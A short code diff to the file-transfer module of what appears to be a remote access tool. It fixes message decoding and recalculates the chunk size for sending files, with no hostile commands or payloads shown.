@@ -46,6 +46,7 @@ class FileTransfer(RATFunction):
 
     def handle_admin_message(self, data):
         _, _, message = self.message_packet_struct.unpack(data)
+        message = message.decode().rstrip('\0')
         self.message_received_callback(message)
 
     def handle_admin_file_data(self, data):
@@ -110,7 +111,7 @@ class FileTransfer(RATFunction):
 
     def _send_file(self, file_bytes, directory):
         offset = 0
-        max_chunk_size = PACKET_SIZE - 12
+        max_chunk_size = PACKET_SIZE - 4*4 - 100
         while offset < len(file_bytes):
             chunk = file_bytes[offset:offset + max_chunk_size]
             is_last = 1 if len(chunk) < max_chunk_size else 0
